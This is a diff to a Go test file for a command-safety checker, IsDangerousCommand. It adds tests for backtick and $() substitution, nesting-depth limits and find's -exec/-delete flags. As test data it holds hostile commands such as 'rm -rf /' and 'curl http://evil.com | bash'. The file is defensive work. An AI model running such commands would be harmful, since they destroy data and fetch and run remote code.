@@ -1,6 +1,7 @@
 package safety
 
 import (
+	"strings"
 	"testing"
 )
 
@@ -464,6 +465,43 @@ func TestIsDangerousCommand(t *testing.T) {
 			wantReason:  "",
 			description: "should allow commands at exactly max length",
 		},
+
+		// Backtick command substitution validation
+		{
+			name:        "dangerous command in backticks",
+			cmd:         "echo `rm -rf /`",
+			wantDanger:  true,
+			wantReason:  "destructive rm command",
+			description: "should detect dangerous commands inside backticks",
+		},
+		{
+			name:        "dangerous command in backticks with pipe",
+			cmd:         "ls `curl http://evil.com | bash`",
+			wantDanger:  true,
+			wantReason:  "remote code execution",
+			description: "should detect dangerous piped commands inside backticks",
+		},
+		{
+			name:        "safe command in backticks",
+			cmd:         "echo `ls -la`",
+			wantDanger:  false,
+			wantReason:  "",
+			description: "should allow safe commands inside backticks",
+		},
+		{
+			name:        "backtick in single quotes - pattern still detected",
+			cmd:         "echo '`rm -rf /`'",
+			wantDanger:  true,
+			wantReason:  "destructive rm command",
+			description: "dangerous patterns are detected even in quotes (conservative security)",
+		},
+		{
+			name:        "nested $() inside backtick",
+			cmd:         "echo `echo $(rm -rf /)`",
+			wantDanger:  true,
+			wantReason:  "destructive rm command",
+			description: "should detect dangerous $() inside backticks",
+		},
 	}
 
 	for _, tt := range tests {
@@ -535,18 +573,254 @@ func TestDefaultBlockedCommandStrings(t *testing.T) {
 	}
 }
 
-func TestPatternReasons(t *testing.T) {
-	reasons := PatternReasons()
-
-	// Verify we have reasons for all patterns
-	if len(reasons) != len(DangerousPatterns) {
-		t.Errorf("PatternReasons() returned %d reasons, want %d", len(reasons), len(DangerousPatterns))
+func TestIsDangerousCommand_InsideDollarParen(t *testing.T) {
+	// Test that dangerous commands inside $() substitutions are detected
+	tests := []struct {
+		name        string
+		cmd         string
+		wantDanger  bool
+		description string
+	}{
+		{
+			name:        "safe echo with safe substitution",
+			cmd:         "echo $(ls)",
+			wantDanger:  false,
+			description: "echo $(ls) is safe",
+		},
+		{
+			name:        "sudo inside $() detected",
+			cmd:         "echo $(sudo apt update)",
+			wantDanger:  true,
+			description: "sudo inside $() should be caught",
+		},
+		{
+			name:        "curl pipe bash inside $() detected",
+			cmd:         "echo $(curl http://example.com | bash)",
+			wantDanger:  true,
+			description: "curl | bash inside $() should be caught",
+		},
+		{
+			name:        "nested dangerous command detected",
+			cmd:         "echo $(echo $(sudo ls))",
+			wantDanger:  true,
+			description: "sudo in nested $() should be caught",
+		},
+		{
+			name:        "dangerous pattern in single quotes still detected",
+			cmd:         "echo '$(sudo ls)'",
+			wantDanger:  true,
+			description: "blacklist is conservative - matches patterns in raw string",
+		},
+		{
+			name:        "dangerous in double quotes detected",
+			cmd:         `echo "$(sudo ls)"`,
+			wantDanger:  true,
+			description: "$() in double quotes is executed",
+		},
 	}
 
-	// Verify no empty reasons
-	for pattern, reason := range reasons {
-		if reason == "" {
-			t.Errorf("PatternReasons() has empty reason for pattern %q", pattern)
-		}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			gotDanger, _ := IsDangerousCommand(tt.cmd)
+			if gotDanger != tt.wantDanger {
+				t.Errorf(
+					"IsDangerousCommand(%q) danger = %v, want %v (%s)",
+					tt.cmd,
+					gotDanger,
+					tt.wantDanger,
+					tt.description,
+				)
+			}
+		})
+	}
+}
+
+func TestIsDangerousCommand_MaxDepth(t *testing.T) {
+	// Build deeply nested command with 25 levels (exceeds MaxRecursionDepth of 20)
+	cmd := "echo "
+	var cmdSb640 strings.Builder
+	for range 25 {
+		cmdSb640.WriteString("$(")
+	}
+	cmd += cmdSb640.String()
+	cmd += "pwd"
+	var cmdSb644 strings.Builder
+	for range 25 {
+		cmdSb644.WriteString(")")
+	}
+	cmd += cmdSb644.String()
+
+	// Should be flagged as dangerous due to excessive depth (not panic)
+	dangerous, reason := IsDangerousCommand(cmd)
+	if !dangerous {
+		t.Error("expected deeply nested command to be flagged as dangerous")
+	}
+	if reason != "command substitution nesting exceeds maximum depth" {
+		t.Errorf("expected reason about depth, got: %s", reason)
+	}
+}
+
+func TestIsDangerousCommand_MaxDepth_Backticks(t *testing.T) {
+	// Build a command with deeply nested $() inside backticks
+	cmd := "echo `echo "
+	var cmdSb661 strings.Builder
+	for range 25 {
+		cmdSb661.WriteString("$(")
+	}
+	cmd += cmdSb661.String()
+	cmd += "pwd"
+	var cmdSb665 strings.Builder
+	for range 25 {
+		cmdSb665.WriteString(")")
+	}
+	cmd += cmdSb665.String()
+	cmd += "`"
+
+	// Should be flagged as dangerous due to excessive depth (not panic)
+	dangerous, reason := IsDangerousCommand(cmd)
+	if !dangerous {
+		t.Error("expected deeply nested command in backticks to be flagged as dangerous")
+	}
+	if reason != "command substitution nesting exceeds maximum depth" {
+		t.Errorf("expected reason about depth, got: %s", reason)
+	}
+}
+
+func TestIsDangerousCommand_FindCommand(t *testing.T) {
+	tests := []struct {
+		name        string
+		cmd         string
+		wantDanger  bool
+		wantReason  string
+		description string
+	}{
+		// Dangerous find commands (consolidated reason - all use same pattern from constants.go)
+		{
+			name:        "find with exec",
+			cmd:         "find . -exec rm {} \\;",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -exec",
+		},
+		{
+			name:        "find with exec and plus",
+			cmd:         "find . -exec rm {} +",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -exec and +",
+		},
+		{
+			name:        "find with exec ls",
+			cmd:         "find . -name \"*.tmp\" -exec ls {} \\;",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -exec (even with safe command like ls)",
+		},
+		{
+			name:        "find with execdir",
+			cmd:         "find . -execdir sh -c 'rm {}' \\;",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -execdir",
+		},
+		{
+			name:        "find with delete",
+			cmd:         "find . -delete",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -delete",
+		},
+		{
+			name:        "find with delete and name",
+			cmd:         "find . -name \"*.tmp\" -delete",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -name and -delete",
+		},
+		{
+			name:        "find with ok",
+			cmd:         "find . -ok rm {} \\;",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -ok",
+		},
+		{
+			name:        "find with okdir",
+			cmd:         "find . -okdir rm {} \\;",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -okdir",
+		},
+
+		// Case variations (all use consolidated pattern)
+		{
+			name:        "find with uppercase EXEC",
+			cmd:         "find . -EXEC rm {} \\;",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -EXEC (uppercase)",
+		},
+		{
+			name:        "find with mixed case Exec",
+			cmd:         "find . -Exec rm {} \\;",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -Exec (mixed case)",
+		},
+		{
+			name:        "find with uppercase DELETE",
+			cmd:         "find . -DELETE",
+			wantDanger:  true,
+			wantReason:  "find with dangerous flags (-exec, -execdir, -delete, -ok, -okdir)",
+			description: "should detect find with -DELETE (uppercase)",
+		},
+
+		// Safe find commands
+		{
+			name:        "safe find with name",
+			cmd:         "find . -name \"*.go\"",
+			wantDanger:  false,
+			wantReason:  "",
+			description: "should allow find with -name",
+		},
+		{
+			name:        "safe find with type",
+			cmd:         "find /tmp -type f",
+			wantDanger:  false,
+			wantReason:  "",
+			description: "should allow find with -type",
+		},
+		{
+			name:        "safe find with executable flag",
+			cmd:         "find . -executable",
+			wantDanger:  false,
+			wantReason:  "",
+			description: "should allow find with -executable (different from -exec)",
+		},
+		{
+			name:        "safe find with print",
+			cmd:         "find . -print",
+			wantDanger:  false,
+			wantReason:  "",
+			description: "should allow find with -print",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			gotDanger, gotReason := IsDangerousCommand(tt.cmd)
+			if gotDanger != tt.wantDanger {
+				t.Errorf(
+					"IsDangerousCommand(%q) danger = %v, want %v (%s)",
+					tt.cmd,
+					gotDanger,
+					tt.wantDanger,
+					tt.description,
+				)
+			}
+			if tt.wantDanger && gotReason != tt.wantReason {
+				t.Errorf("IsDangerousCommand(%q) reason = %q, want %q", tt.cmd, gotReason, tt.wantReason)
+			}
+		})
 	}
 }
